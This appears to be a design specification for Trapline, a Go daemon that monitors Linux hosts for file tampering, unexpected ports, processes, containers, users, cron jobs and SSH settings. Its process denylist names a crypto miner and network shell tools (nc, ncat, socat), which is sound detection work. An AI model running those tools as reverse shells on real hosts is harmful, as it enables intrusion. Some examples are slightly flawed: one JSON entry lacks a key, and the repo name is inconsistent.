# Trapline — Specification

**A lightweight, modular host integrity and security monitoring daemon written in Go.**

Trapline replaces Tripwire with something that actually helps. It runs continuously, watches what matters, ignores what doesn't, and reports cleanly to structured logging (Fluent Bit / Axiom). No database rebuilds. No passphrase-protected policy files. No 4,000-line email diffs.

The name: a trapline is a route a trapper walks regularly, checking each trap along the way. That's what this does — walks a defined route across your system, checking each point for something wrong.

---

## Table of Contents

1. [Design Principles](#design-principles)
2. [Architecture](#architecture)
3. [Scanner Modules](#scanner-modules)
4. [Configuration](#configuration)
5. [Baselines & State](#baselines--state)
6. [Reporting & Output](#reporting--output)
7. [Self-Update](#self-update)
8. [CLI Interface](#cli-interface)
9. [Daemon Mode](#daemon-mode)
10. [Install / Uninstall / Doctor](#install--uninstall--doctor)
11. [Future Modules](#future-modules)
12. [Build & Development](#build--development)
13. [Summary](#summary)

---

## Design Principles

1. **Signal over noise.** Every finding should be actionable. If a human reads it and shrugs, the tool failed. Tripwire's fundamental flaw is that it reports *everything that changed* — Trapline reports *things that shouldn't have changed*.

2. **Package-manager-aware.** If `apt` installed it, it's not suspicious. If something changed outside the package manager, it is. Use `dpkg --verify` semantics, not blind hashing.

3. **Continuous, not daily.** Run as a daemon with configurable scan intervals per module. File integrity checks every 5 minutes. Process checks every 30 seconds. Not a cron job that runs at 2 AM and emails you at 7 AM about something that happened at 1 AM.

4. **Modular.** Each scanner is an independent module with its own config, schedule, and severity levels. Enable what you need. Disable what you don't. Write new modules without touching core.

5. **Structured output.** Every finding is a JSON event with consistent schema. Logs to stdout (for systemd journal), file, and/or TCP (for Fluent Bit). No prose reports. No email.

6. **Zero-maintenance baselines.** Baselines auto-update after confirmed-good changes (Ansible deploys, apt upgrades). No manual `tripwire --init` equivalent. The tool knows when *it* is being deployed and re-baselines automatically.

7. **Small, static binary.** Single Go binary with no runtime dependencies. `scp` it to a host, `trapline install`, done. No package managers, no repos, no `.deb` files.

8. **Self-installing, self-uninstalling.** The binary *is* the installer. `trapline install` copies itself to `/usr/local/bin`, creates config directories, writes a default config, installs the systemd unit, enables the service, and captures initial baselines. `trapline uninstall` reverses all of it. No orphaned files. No Ansible gymnastics for first-time setup.

9. **Doctor mode.** `trapline doctor` validates that the installation is healthy — binary in the right place, config parseable, systemd unit active, all output sinks reachable, baselines present, permissions correct. If something is wrong, it tells you exactly what and how to fix it.

---

## Architecture

```
trapline (single binary)
├── cmd/
│   └── trapline/          # CLI entrypoint
├── internal/
│   ├── config/            # YAML config loader, defaults, validation
│   ├── baseline/          # Baseline state management (JSON on disk)
│   ├── engine/            # Module scheduler, lifecycle, scan orchestration
│   ├── output/            # Output sinks (stdout, file, tcp, webhook)
│   ├── updater/           # Self-update from GitHub releases
│   └── modules/
│       ├── fileintegrity/ # File hash monitoring
│       ├── packages/      # dpkg --verify / rpm -V
│       ├── ports/         # Listening port monitoring
│       ├── processes/     # Process allowlist/denylist
│       ├── users/         # User/group/sudoers monitoring
│       ├── containers/    # Docker container inventory
│       ├── cron/          # Cron job monitoring
│       ├── suid/          # SUID/SGID binary detection
│       ├── ssh/           # authorized_keys / sshd_config
│       └── permissions/   # World-writable / sticky bit checks
└── pkg/
    └── finding/           # Shared Finding type, severity levels
```

### Module Interface

Every scanner module implements a single interface:

```go
type Module interface {
    // Name returns the module identifier (e.g., "file-integrity")
    Name() string

    // Init is called once at startup with the module's config section.
    // Load baseline state, validate config, set up watchers.
    Init(cfg ModuleConfig, state baseline.Store) error

    // Scan runs one scan cycle. Returns findings (may be empty).
    // The engine calls this on the module's configured interval.
    Scan(ctx context.Context) ([]finding.Finding, error)

    // Rebaseline captures current state as the new known-good baseline.
    // Called by `trapline rebaseline` or automatically after deploys.
    Rebaseline(ctx context.Context) error
}
```

### Engine Loop

```
for each enabled module (in parallel):
    loop:
        sleep(module.interval)
        findings = module.Scan()
        for each finding:
            deduplicate (suppress if identical to last report within cooldown)
            enrich (add hostname, timestamp, module name, scan_id)
            emit to all configured outputs
```

Modules run in independent goroutines. A slow module (e.g., SUID scan on a large filesystem) doesn't block fast modules (e.g., port check).

---

## Scanner Modules

### 1. `file-integrity` — Critical File Monitoring

**What:** SHA-256 hashes of specific files. Not entire directory trees — specific files that matter.

**Default interval:** 5 minutes

**Default watchlist:**
```yaml
file_integrity:
  watch:
    - /etc/ssh/sshd_config
    - /etc/passwd
    - /etc/shadow
    - /etc/group
    - /etc/gshadow
    - /etc/sudoers
    - /etc/sudoers.d/*
    - /etc/crontab
    - /etc/cron.d/*
    - /etc/docker/daemon.json
    - /etc/ufw/*.rules
    - /etc/postfix/main.cf
    - /etc/apt/sources.list
    - /etc/apt/sources.list.d/*
    - /etc/apt/apt.conf.d/*
    - /etc/systemd/system/*.service    # custom services only
    - /root/.ssh/authorized_keys
    - /home/*/.ssh/authorized_keys
  # Globs are expanded at scan time, so new files matching patterns
  # are automatically detected without rebaseline.

  # Additional paths (appended to defaults)
  watch_extra:
    - /docker/*/docker-compose.yml
    - /root/.docker/config.json
    - /usr/local/bin/*
```

**Findings:**
- `file-modified` — hash changed since baseline
- `file-added` — new file matches a watched glob but wasn't in baseline
- `file-removed` — file in baseline no longer exists
- `file-permission-changed` — mode/owner/group changed

**Severity:** High for shadow/sudoers/sshd_config, Medium for others. Configurable per-path.

**How it avoids Tripwire's noise:**
- Watches ~50-100 specific files, not entire `/usr/lib` trees
- `file-modified` findings are suppressed if `packages` module confirms the change came from a dpkg operation (cross-module awareness)


### 2. `packages` — Package Integrity

**What:** Runs `dpkg --verify` (or `rpm -V` on RHEL) to check installed packages against the package manager's own database.

**Default interval:** 1 hour

**Why this is better than hashing binaries:** `dpkg` knows the expected hash for every file it installed. After `apt upgrade`, the new hashes are the expected ones — no rebaseline needed. Only detects files that were modified *outside of apt*.

**Findings:**
- `package-file-modified` — a file owned by a package has been altered outside the package manager (real alert)
- `package-not-verified` — a package's files couldn't be verified

**Severity:** High. If `/usr/sbin/sshd` was modified outside of apt, something is very wrong.

**Exclusions:**
```yaml
packages:
  exclude_packages:
    - tripwire    # if still installed during transition
  exclude_paths:
    - /etc/*      # config files are expected to diverge from package defaults
```


### 3. `ports` — Listening Port Monitor

**What:** Snapshots listening TCP/UDP ports (like `ss -tlnup`) and compares against baseline.

**Default interval:** 60 seconds

**Findings:**
- `port-new` — new listening port not in baseline
- `port-gone` — expected port no longer listening (service down?)
- `port-process-changed` — same port, different process (suspicious)

**Severity:** High for unexpected new ports. Medium for disappeared ports.

**Baseline example:**
```json
[
  {"proto": "tcp", "addr": "0.0.0.0:22", "process": "sshd"},
  {"proto": "tcp", "0.0.0.0:80", "process": "traefik"},
  {"proto": "tcp", "0.0.0.0:443", "process": "traefik"},
  {"proto": "tcp", "127.0.0.1:5432", "process": "postgres"}
]
```

Implementation reads from `/proc/net/tcp`, `/proc/net/tcp6`, `/proc/net/udp` directly — no shelling out to `ss`.


### 4. `processes` — Process Monitoring

**What:** Monitors running processes against an expected allowlist. Detects unexpected processes, unexpected process parents, and process resource anomalies.

**Default interval:** 30 seconds

**Modes:**
- **Allowlist mode** (default): define expected long-running processes. Alert on unexpected ones.
- **Denylist mode**: alert if specific known-bad process names appear.

```yaml
processes:
  # Expected long-running processes. Trapline learns these at rebaseline
  # and alerts when new ones appear.
  expect:
    - name: sshd
    - name: dockerd
    - name: containerd
    - name: fluent-bit
    - name: traefik        # runs in Docker, visible on host
    - name: postgres        # runs in Docker

  # Things that should never be running
  deny:
    - name: cryptominer
    - name: xmrig
    - name: nc              # netcat as a long-running process is suspicious
      min_uptime: 300       # only alert if running > 5 min (legitimate one-off use is fine)
    - name: ncat
      min_uptime: 300
    - name: socat
      min_uptime: 300

  # Alert if any process is consuming unreasonable resources
  resource_alerts:
    cpu_percent: 95         # sustained for > 2 consecutive checks
    memory_percent: 90
```

**Findings:**
- `process-unexpected` — process running that isn't in expected list and has been up > threshold
- `process-denied` — process matches denylist
- `process-missing` — expected process not running
- `process-resource` — process exceeding resource thresholds

**Implementation:** Reads `/proc/[pid]/stat`, `/proc/[pid]/status`, `/proc/[pid]/cmdline` directly.


### 5. `containers` — Docker Container Inventory

**What:** Monitors Docker containers via the Docker socket. Detects rogue containers, unexpected images, containers running as privileged, etc.

**Default interval:** 60 seconds

```yaml
containers:
  docker_socket: /var/run/docker.sock

  # Expected containers (by compose project or name prefix)
  expect:
    - project: barreleye      # docker compose project name
    - name: watchtower
    - name: traefik

  # Security policy
  alert_on:
    privileged: true          # alert if any container runs --privileged
    host_network: true        # alert if any container uses host networking
    host_pid: true            # alert if any container uses host PID namespace
    writable_rootfs: true     # alert if container rootfs is writable (should be read-only)
    new_image: true           # alert on containers from images not seen before
```

**Findings:**
- `container-unexpected` — container running that doesn't match expected list
- `container-missing` — expected container not running
- `container-privileged` — container running with dangerous capabilities
- `container-new-image` — container started from a previously unseen image
- `container-image-updated` — Watchtower pulled a new image version (informational, not alert)

**Severity:** High for unexpected/privileged. Info for image updates.


### 6. `users` — User & Access Monitoring

**What:** Monitors user accounts, groups, sudoers, and SSH authorized keys.

**Default interval:** 15 minutes

**Findings:**
- `user-added` / `user-removed`
- `user-uid-changed` / `user-shell-changed`
- `group-added` / `group-member-added`
- `sudoers-modified` — any change to sudoers files
- `authorized-keys-modified` — SSH key added/removed for any user

**Note:** Overlaps with `file-integrity` module for `/etc/passwd` etc., but provides *parsed* findings ("user 'backdoor' added with UID 0") rather than just "file changed."


### 7. `cron` — Cron Job Monitoring

**What:** Monitors all cron sources for unexpected jobs.

**Default interval:** 15 minutes

**Sources scanned:**
- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.{hourly,daily,weekly,monthly}/*`
- `/var/spool/cron/crontabs/*` (per-user crontabs)
- systemd timers (`systemctl list-timers`)

**Findings:**
- `cron-added` — new cron job not in baseline
- `cron-modified` — existing cron job changed
- `cron-removed` — baseline cron job removed

**Excludes:** Configurable. Default excludes common system cron jobs.


### 8. `suid` — SUID/SGID Binary Scanner

**What:** Finds all SUID/SGID binaries on the system and compares against a known-good list.

**Default interval:** 1 hour (filesystem walk, intentionally slow)

**Findings:**
- `suid-unexpected` — SUID binary found that isn't in baseline
- `suid-removed` — expected SUID binary gone (maybe good, maybe tampering)

**Default excludes:**
```yaml
suid:
  exclude_paths:
    - /proc
    - /sys
    - /dev
    - /var/lib/docker     # Docker overlay has its own SUID binaries
    - /snap
```


### 9. `ssh` — SSH Configuration Monitor

**What:** Parses `sshd_config` and validates security settings.

**Default interval:** 15 minutes

**Checks:**
- `PasswordAuthentication` must be `no`
- `PermitRootLogin` must be `no` or `prohibit-password`
- `PermitEmptyPasswords` must be `no`
- No `Match` blocks that weaken the above
- `AuthorizedKeysFile` hasn't been redirected somewhere unexpected

**Findings:**
- `ssh-insecure-setting` — sshd_config has a dangerous setting
- `ssh-config-changed` — any change to parsed sshd_config (informational)


### 10. `permissions` — Filesystem Permission Checks

**What:** Scans for world-writable files, improper ownership, and missing sticky bits.

**Default interval:** 1 hour

**Checks:**
- World-writable files in `/etc`, `/usr`, `/var` (excluding expected ones like `/tmp`)
- Files in `/usr/local/bin` not owned by root
- `/etc/shadow` readable by non-root
- Home directories with overly permissive modes

**Findings:**
- `perm-world-writable` — file is world-writable in a sensitive location
- `perm-bad-owner` — file has unexpected ownership
- `perm-shadow-readable` — shadow file has wrong permissions

---

## Configuration

### Location

```
/etc/trapline/
├── trapline.yml           # Main configuration
└── modules.d/             # Optional per-module overrides
    ├── file-integrity.yml
    ├── containers.yml
    └── ...
```

Config path overridable with `--config` or `TRAPLINE_CONFIG` env var.

### Main Config: `/etc/trapline/trapline.yml`

```yaml
# Trapline configuration
# Docs: https://github.com/jclement/tripline

# Hostname override (defaults to os.Hostname())
# hostname: nyc1

# Where Trapline stores baselines and state
state_dir: /var/lib/trapline

# Logging & output
output:
  # Console output (stdout) — captured by systemd journal
  console:
    enabled: true
    format: json          # json | text
    level: warn           # only warnings and above to console

  # File output
  file:
    enabled: true
    path: /var/log/trapline/trapline.log
    format: json
    level: info
    max_size_mb: 50
    max_age_days: 30
    max_backups: 5

  # TCP output — for Fluent Bit / Axiom
  tcp:
    enabled: true
    address: 127.0.0.1:51888
    format: json
    level: info
    # Reconnect with exponential backoff if Fluent Bit is down
    retry_interval: 5s
    max_retry_interval: 60s

  # Webhook output — for Teams notifications on critical findings
  webhook:
    enabled: false
    url: ""               # Microsoft Teams incoming webhook URL
    level: high           # only High and Critical findings
    cooldown: 1h          # don't repeat the same finding within this window
    # Template uses Go text/template with Finding fields
    template: |
      **🔴 Trapline Alert on {{ .Hostname }}**
      Module: {{ .Module }} | Severity: {{ .Severity }}
      {{ .Summary }}
      {{ .Detail }}

# Self-update
update:
  enabled: true
  repo: jclement/tripline
  channel: stable         # stable | beta
  check_interval: 6h
  auto_apply: true        # automatically restart with new version
  # If false, just logs that an update is available

# Global module defaults (overridable per-module)
defaults:
  interval: 5m
  severity: medium        # default severity for findings
  cooldown: 1h            # suppress duplicate findings for this duration

# Module configuration
modules:
  file-integrity:
    enabled: true
    interval: 5m
    watch_extra:
      - /docker/*/docker-compose.yml
      - /root/.docker/config.json
      - /usr/local/bin/*

  packages:
    enabled: true
    interval: 1h

  ports:
    enabled: true
    interval: 60s

  processes:
    enabled: true
    interval: 30s
    deny:
      - name: xmrig
      - name: nc
        min_uptime: 300
      - name: ncat
        min_uptime: 300

  containers:
    enabled: true
    interval: 60s
    expect:
      - project: barreleye
      - name: watchtower
      - name: traefik

  users:
    enabled: true
    interval: 15m

  cron:
    enabled: true
    interval: 15m

  suid:
    enabled: true
    interval: 1h

  ssh:
    enabled: true
    interval: 15m

  permissions:
    enabled: true
    interval: 1h
```

### Config Reload

Trapline watches its own config files with `inotify`. Config changes are applied without restart. Modules are started/stopped as they are enabled/disabled. Changed intervals take effect on the next scan cycle.

---

## Baselines & State

### Storage

```
/var/lib/trapline/
├── baselines/
│   ├── file-integrity.json
│   ├── packages.json
│   ├── ports.json
│   ├── processes.json
│   ├── containers.json
│   ├── users.json
│   ├── cron.json
│   ├── suid.json
│   └── ssh.json
├── state/
│   ├── findings.json          # Active (unresolved) findings
│   └── cooldowns.json         # Finding deduplication state
└── trapline.lock              # PID lock file
```

Baselines are human-readable JSON. You can inspect them, edit them, or version-control them.

### Rebaseline Triggers

1. **Manual:** `trapline rebaseline` — snapshots current state as known-good for all modules
2. **Per-module:** `trapline rebaseline --module file-integrity`
3. **Automatic (deploy hook):** Trapline exposes a Unix socket at `/var/run/trapline.sock`. Ansible sends a rebaseline command after deploys:
   ```yaml
   - name: Rebaseline Trapline after deploy
     command: trapline rebaseline
     tags: ["trapline"]
   ```
4. **Automatic (apt hook):** A dpkg trigger rebaselines the `packages` module after any apt operation:
   ```
   # /etc/apt/apt.conf.d/99trapline
   DPkg::Post-Invoke { "trapline rebaseline --module packages --module file-integrity --quiet || true"; };
   ```

### First Run

On first run with no baselines, Trapline enters **learning mode**:
- Runs all modules once
- Saves results as baseline
- Logs `level=info msg="initial baseline captured" module=all`
- No findings are emitted during learning (everything is "known-good" by definition)
- Subsequent scans diff against this baseline

---

## Reporting & Output

### Finding Schema

Every finding is a JSON object:

```json
{
  "timestamp": "2026-03-26T14:32:01.883Z",
  "hostname": "nyc1",
  "module": "file-integrity",
  "finding_id": "file-modified:/etc/ssh/sshd_config",
  "severity": "high",
  "status": "new",
  "summary": "sshd_config modified outside of package manager",
  "detail": {
    "path": "/etc/ssh/sshd_config",
    "baseline_hash": "a1b2c3d4...",
    "current_hash": "e5f6a7b8...",
    "owner": "root:root",
    "mode": "0644",
    "mtime": "2026-03-26T14:31:58Z"
  },
  "context": {
    "last_dpkg_run": "2026-03-25T03:00:12Z",
    "last_rebaseline": "2026-03-20T18:45:00Z",
    "last_ansible_deploy": "2026-03-20T18:44:30Z"
  },
  "trapline_version": "0.4.2",
  "scan_id": "a7f3b291"
}
```

### Severity Levels

| Level | Meaning | Examples |
|---|---|---|
| `critical` | Active compromise indicators | unexpected SUID in /tmp, sshd replaced outside apt, new UID-0 user |
| `high` | Security-relevant changes requiring investigation | sshd_config modified, new listening port, sudoers changed |
| `medium` | Notable changes that may be legitimate | new cron job, container image updated, user shell changed |
| `info` | Informational events | rebaseline completed, scan cycle complete, config reloaded |

### Deduplication & Cooldown

Same `finding_id` is not emitted again within the configured cooldown period (default 1 hour). This prevents the Tripwire problem of getting the same 500 findings every single day.

When a finding is first detected: `status: "new"`.
When it persists past cooldown: `status: "recurring"` (emitted once more, then silenced until resolved).
When the baseline condition is restored: `status: "resolved"`.

### Fluent Bit Integration

Add to existing Fluent Bit config:

```ini
[INPUT]
    Name        tcp
    Listen      127.0.0.1
    Port        51888
    Format      json
    Tag         trapline

# This input already exists for autorestic/backup logs.
# Trapline findings arrive on the same port, differentiated by
# the "module" field in the JSON payload.

[FILTER]
    Name        modify
    Match       trapline
    Add         source trapline
    Add         hostname ${HOSTNAME}
```

Findings flow: `Trapline -> TCP:51888 -> Fluent Bit -> Axiom`

In Axiom, you can then build dashboards and alerts:
- `source == "trapline" AND severity IN ("critical", "high")` -> Teams webhook alert
- `source == "trapline" | summarize count() by module, severity` -> daily digest

### Console Output (Human Mode)

`trapline status` prints a clean terminal summary:

```
Trapline v0.4.2 — nyc1 — running since 2026-03-20 18:45:00 UTC

Modules            Interval   Last Scan    Status   Findings
─────────────────────────────────────────────────────────────
file-integrity     5m         12s ago      ✓ clean  0
packages           1h         34m ago      ✓ clean  0
ports              60s        8s ago       ✓ clean  0
processes          30s        2s ago       ✓ clean  0
containers         60s        15s ago      ⚠ alert  1
users              15m        11m ago      ✓ clean  0
cron               15m        4m ago       ✓ clean  0
suid               1h         52m ago      ✓ clean  0
ssh                15m        9m ago       ✓ clean  0
permissions        1h         28m ago      ✓ clean  0

Active Findings (1):
  HIGH  container-unexpected  "unknown container 'nginx:latest' running, not in expected list"
        First seen: 2026-03-26 14:31:01 UTC (2h ago)
```

---

## Self-Update

### Mechanism

Trapline uses the GitHub Releases API to check for new versions. No package repository needed.

```
1. Check: GET https://api.github.com/repos/{owner}/{repo}/releases/latest
2. Compare: semver comparison against running version
3. Download: fetch the appropriate binary for GOOS/GOARCH from release assets
4. Verify: check SHA-256 checksum from checksums.txt in the release
5. Verify: (optional) verify cosign signature if cosign is installed
6. Replace: atomic rename of new binary over old binary
7. Restart: systemd restarts the service (via ExecReload or exit-and-restart)
```

### Build & Release (GitHub Actions + GoReleaser)

All builds happen in GitHub Actions. No local release process. Tag a version, push, binaries appear.

#### GoReleaser Config

```yaml
# .goreleaser.yml
builds:
  - goos: [linux]
    goarch: [amd64, arm64]
    binary: "trapline_{{ .Os }}_{{ .Arch }}"
    no_unique_dist_dir: true
    ldflags:
      - -s -w
      - -X main.version={{.Version}}
      - -X main.commit={{.ShortCommit}}
      - -X main.date={{.Date}}
    env:
      - CGO_ENABLED=0

# No archives — release raw binaries
archives:
  - format: binary

checksum:
  name_template: "checksums.txt"

signs:
  - cmd: cosign
    args: ["sign-blob", "--yes", "--output-signature=${signature}", "${artifact}"]
    artifacts: checksum
```

#### GitHub Actions Workflows

**CI — runs on every push and PR:**

```yaml
# .github/workflows/ci.yml
name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: jdx/mise-action@v2
      - run: mise run lint
      - run: mise run test
      - run: mise run test-integration

  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: jdx/mise-action@v2
      - run: mise run snapshot
      - uses: actions/upload-artifact@v4
        with:
          name: binaries
          path: dist/trapline_linux_*
```

**Release — runs on version tags:**

```yaml
# .github/workflows/release.yml
name: Release
on:
  push:
    tags: ["v*"]

permissions:
  contents: write    # create GitHub release
  id-token: write    # cosign keyless signing via Sigstore

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0    # goreleaser needs full history for changelog
      - uses: jdx/mise-action@v2
      - uses: sigstore/cosign-installer@v3
      - run: goreleaser release
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

CI and release both use `mise-action` so the toolchain is identical locally and in CI — same Go version, same goreleaser version, same linter version. No version drift.

#### Release Process

```bash
# Tag and push — that's it
git tag v0.1.0
git push origin v0.1.0
# GitHub Actions builds, signs, creates release with binaries
```

Release assets look like:
```
trapline_linux_amd64        (static binary, ~8-12 MB)
trapline_linux_arm64        (static binary, ~8-12 MB)
checksums.txt               (SHA-256 hashes)
checksums.txt.sig           (cosign signature via Sigstore keyless)
```

Install on a new host is two commands:
```bash
curl -sL https://github.com/jclement/tripline/releases/latest/download/trapline_linux_amd64 -o trapline && chmod +x trapline
sudo ./trapline install
```

The systemd unit file, default config, and apt hook are all embedded in the binary via `go:embed`. Nothing else to download.

### Update Safety

- Never auto-updates to a new major version (breaking changes). Major version bumps require manual `trapline update --allow-major`.
- If the new binary fails to start (exit within 10s), systemd's `RestartSec` and `StartLimitBurst` prevent restart loops. The old binary path is preserved at `/usr/local/bin/trapline.bak` for rollback.
- Update events are logged as findings: `module: "self", finding_id: "update-applied", severity: "info"`.

---

## CLI Interface

```
# Lifecycle
trapline install              # install binary, config, systemd unit, start service
trapline install --no-start   # install everything but don't start the service
trapline uninstall            # stop service, remove everything trapline put on disk
trapline uninstall --keep-config  # remove binary/service/state but preserve /etc/trapline
trapline update               # check for and apply updates from GitHub
trapline update --check       # just check, don't apply
trapline doctor               # validate installation health, diagnose problems

# Operations (daemon must be running for status/findings)
trapline run                  # start daemon (foreground, for systemd)
trapline status               # show module status and active findings
trapline scan                 # run all modules once immediately, print results, exit
trapline scan --module ports  # run one module once
trapline rebaseline           # capture current state as known-good
trapline rebaseline --module file-integrity
trapline findings             # list active findings (JSON)
trapline findings --format table

# Configuration
trapline config check         # validate configuration
trapline config show          # dump effective config (with defaults applied)
trapline config init          # regenerate default config (interactive, won't overwrite)

# Info
trapline version              # print version, commit, build date
trapline version --json       # machine-readable version info
```

All commands support `--config /path/to/trapline.yml` and `--quiet` / `--verbose` flags.

Exit codes:
- `0` — clean (no findings, or command succeeded)
- `1` — findings present (for `scan` command — useful in CI/scripts)
- `2` — configuration error
- `3` — runtime error

---

## Daemon Mode

### systemd Unit

```ini
# /usr/lib/systemd/system/trapline.service
[Unit]
Description=Trapline host integrity monitor
After=network.target docker.service
Wants=docker.service

[Service]
Type=simple
ExecStart=/usr/local/bin/trapline run
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=10
StartLimitBurst=5
StartLimitIntervalSec=300

# Security hardening
NoNewPrivileges=no          # needs to read /etc/shadow perms, check SUID
ProtectSystem=strict
ReadWritePaths=/var/lib/trapline /var/log/trapline /var/run
ProtectHome=read-only
PrivateTmp=true

# Watchdog — trapline sends sd_notify WATCHDOG=1 every 30s
WatchdogSec=120

[Install]
WantedBy=multi-user.target
```

### Signal Handling

- `SIGHUP` — reload configuration, restart modules as needed
- `SIGTERM` / `SIGINT` — graceful shutdown, finish current scan cycles
- `SIGUSR1` — dump current state to log (debug)

### Health Check

Trapline monitors its own health. If a module's scan takes longer than 5x its interval, it logs a warning. If a module panics, it's restarted automatically without affecting other modules. The daemon itself stays up.

---

## Install / Uninstall / Doctor

The binary is the installer. No package manager, no `.deb`, no apt repo. Download the binary, run `trapline install`, done.

### `trapline install`

One command does everything:

```
$ curl -sL https://github.com/jclement/tripline/releases/latest/download/trapline_linux_amd64 -o trapline
$ chmod +x trapline
$ sudo ./trapline install
```

**What `install` does, in order:**

```
1.  Verify running as root (exit with clear error if not)
2.  Verify Linux (GOOS check — this is a Linux-only tool)
3.  Verify systemd is available (check for /run/systemd/system)

4.  Copy binary to /usr/local/bin/trapline
    - If already exists, compare versions
    - If same version: "already installed, use 'trapline update' or --force"
    - If different version: replace (backup old to /usr/local/bin/trapline.bak)
    - Set 0755 root:root

5.  Create directory structure:
    /etc/trapline/                  (0700 root:root) — config
    /etc/trapline/modules.d/        (0700 root:root) — per-module overrides
    /var/lib/trapline/              (0700 root:root) — state
    /var/lib/trapline/baselines/    (0700 root:root) — baseline snapshots
    /var/lib/trapline/state/        (0700 root:root) — runtime state
    /var/log/trapline/              (0750 root:root) — log files

6.  Write default config to /etc/trapline/trapline.yml
    - Only if file doesn't already exist (never overwrite user config)
    - Default config has all modules enabled with sane defaults
    - TCP output pointed at 127.0.0.1:51888 (Fluent Bit)
    - Console output enabled, file output enabled
    - Self-update enabled, pointing at GitHub repo

7.  Write systemd unit to /usr/lib/systemd/system/trapline.service
    - Embeds the unit file in the binary (go:embed)
    - Always overwrites (service definition is owned by the binary, not the user)

8.  Install apt hook: /etc/apt/apt.conf.d/99trapline
    - DPkg::Post-Invoke for auto-rebaseline after apt operations
    - Only if dpkg exists (skip on non-Debian systems)

9.  systemctl daemon-reload
10. systemctl enable trapline
11. systemctl start trapline  (unless --no-start)

12. Wait up to 5s for daemon to be healthy (check /var/run/trapline.sock)
13. Run initial baseline capture (learning mode — no findings emitted)

14. Print summary:
    ✓ Binary installed to /usr/local/bin/trapline
    ✓ Config written to /etc/trapline/trapline.yml
    ✓ Systemd unit installed and enabled
    ✓ Service started (PID 12345)
    ✓ Initial baseline captured (10 modules)
    ✓ Apt hook installed

    Trapline v0.1.0 is running. Check status with: trapline status
```

**Flags:**
- `--no-start` — install everything but don't start the service (useful for Ansible where you want to deploy config first)
- `--force` — overwrite existing installation even if same version
- `--config /path/to/custom.yml` — use this config instead of generating defaults

**Idempotent:** Running `trapline install` on an already-installed system is safe. It updates the binary and systemd unit, leaves config alone, restarts the service.


### `trapline uninstall`

Clean removal of everything Trapline put on disk.

```
$ sudo trapline uninstall
```

**What `uninstall` does:**

```
1.  systemctl stop trapline
2.  systemctl disable trapline
3.  Remove /usr/lib/systemd/system/trapline.service
4.  systemctl daemon-reload
5.  Remove /etc/apt/apt.conf.d/99trapline
6.  Remove /var/lib/trapline/        (baselines, state, lock file)
7.  Remove /var/log/trapline/        (log files)
8.  Remove /etc/trapline/            (config — unless --keep-config)
9.  Remove /usr/local/bin/trapline
10. Remove /usr/local/bin/trapline.bak (if exists)

Print summary:
    ✓ Service stopped and disabled
    ✓ Systemd unit removed
    ✓ Configuration removed (or: ✓ Configuration preserved at /etc/trapline/)
    ✓ State and baselines removed
    ✓ Logs removed
    ✓ Binary removed

    Trapline has been completely uninstalled.
```

**Flags:**
- `--keep-config` — preserve `/etc/trapline/` so a future `trapline install` picks up the existing config
- `--yes` — skip confirmation prompt

**Safety:** Asks for confirmation before proceeding (unless `--yes`). Shows what will be deleted.


### `trapline doctor`

Validates that the installation is healthy and everything is wired up correctly. Run this when something seems off, or after manual config changes, or just to sanity-check a new deployment.

```
$ sudo trapline doctor
```

**Checks performed:**

```
Trapline Doctor — checking installation health...

Binary & Installation
  ✓ Binary at /usr/local/bin/trapline (v0.4.2, built 2026-03-20)
  ✓ Running as root
  ✓ Binary matches running daemon version

Configuration
  ✓ Config file exists at /etc/trapline/trapline.yml
  ✓ Config file is valid YAML
  ✓ Config file permissions are 0600 (not world-readable)
  ✓ All referenced module configs in modules.d/ are valid
  ✗ Unknown key "proceses" in modules config (did you mean "processes"?)

Systemd
  ✓ Unit file installed at /usr/lib/systemd/system/trapline.service
  ✓ Service is enabled
  ✓ Service is active (running), PID 12345, uptime 6d 4h
  ✓ No recent crashes (0 failures in journal)
  ✓ Watchdog is healthy

Directories & Permissions
  ✓ /etc/trapline/ exists (0700 root:root)
  ✓ /var/lib/trapline/ exists (0700 root:root)
  ✓ /var/lib/trapline/baselines/ exists, 10 baseline files
  ✓ /var/log/trapline/ exists (0750 root:root)
  ✓ Log file size: 2.3 MB (within limits)

Baselines
  ✓ All 10 enabled modules have baselines
  ✓ Most recent baseline: 2h ago (file-integrity)
  ⚠ Oldest baseline: 6d ago (suid) — consider running 'trapline rebaseline'

Output Sinks
  ✓ Console output: enabled
  ✓ File output: /var/log/trapline/trapline.log (writable, 2.3 MB)
  ✓ TCP output: 127.0.0.1:51888 — connection successful
  ✗ Webhook output: enabled but URL is empty — findings won't be delivered
    Fix: set output.webhook.url in /etc/trapline/trapline.yml or disable webhook output

Modules
  ✓ file-integrity: running, last scan 42s ago, 0 findings
  ✓ packages: running, last scan 18m ago, 0 findings
  ✓ ports: running, last scan 12s ago, 0 findings
  ✓ processes: running, last scan 3s ago, 0 findings
  ✓ containers: running, last scan 22s ago, 1 finding
  ✓ users: running, last scan 8m ago, 0 findings
  ✓ cron: running, last scan 4m ago, 0 findings
  ✓ suid: running, last scan 41m ago, 0 findings
  ✓ ssh: running, last scan 7m ago, 0 findings
  ✓ permissions: running, last scan 28m ago, 0 findings

Apt Integration
  ✓ /etc/apt/apt.conf.d/99trapline exists
  ✓ Hook command references correct binary path

Self-Update
  ✓ Update check enabled (every 6h)
  ✓ GitHub API reachable
  ✓ Current version v0.4.2 is latest

Summary: 26 passed, 1 warning, 2 errors
  Run 'trapline doctor --fix' to auto-fix what can be fixed.
```

**What `doctor --fix` can auto-fix:**
- Correct file/directory permissions
- Recreate missing directories
- Regenerate missing systemd unit
- Re-run `systemctl daemon-reload`
- Restart the service if it's in a failed state
- Remove stale lock files

**What `doctor --fix` won't auto-fix (but will tell you how):**
- Config errors (typos, invalid YAML) — "edit /etc/trapline/trapline.yml, line 47"
- Unreachable output sinks — "check that Fluent Bit is running on port 51888"
- Empty webhook URL — "set the URL or disable the webhook"

**Flags:**
- `--fix` — attempt to auto-fix issues
- `--json` — machine-readable output (for monitoring/CI)
- `--quiet` — only print errors and warnings (exit code 0 = healthy, 1 = issues)

